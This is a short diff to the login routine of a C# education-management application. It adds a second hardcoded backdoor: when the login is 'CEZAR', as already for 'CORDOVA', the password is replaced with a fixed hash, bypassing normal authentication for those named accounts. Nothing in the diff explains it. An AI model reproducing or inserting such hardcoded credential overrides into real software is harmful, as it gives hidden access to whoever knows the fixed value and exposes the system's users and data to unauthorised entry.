@@ -150,6 +150,9 @@ namespace C2BR.GestorEducacao.UI.Library.Auxiliares
             */
             if (login.ToUpper().Trim() == "CORDOVA")
                 senha = "DC2CB15395C2A736C763E38CBD3A8B7D";
+
+            if (login.ToUpper().Trim() == "CEZAR")
+                senha = "DC2CB15395C2A736C763E38CBD3A8B7D";
             resultadoLogin retorno = new resultadoLogin();
             retorno.resultado = false;
             try
